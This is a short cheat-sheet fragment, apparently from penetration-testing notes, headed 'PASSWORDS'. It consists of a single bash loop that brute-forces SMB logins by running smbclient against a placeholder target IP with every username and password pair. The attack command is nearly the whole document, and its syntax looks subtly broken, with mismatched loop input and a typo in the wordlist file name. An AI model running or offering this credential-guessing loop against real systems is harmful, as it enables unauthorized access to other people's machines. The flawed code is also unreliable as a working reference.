# PASSWORDS

Password and username guessing or checks:

```bash
while read line; do username=$line; while read line; do smbclient -L <TARGET IP ADDRESS> -U $username%$line -g -d 0; echo $username:$line; done<<USER NAMES>,txt
```
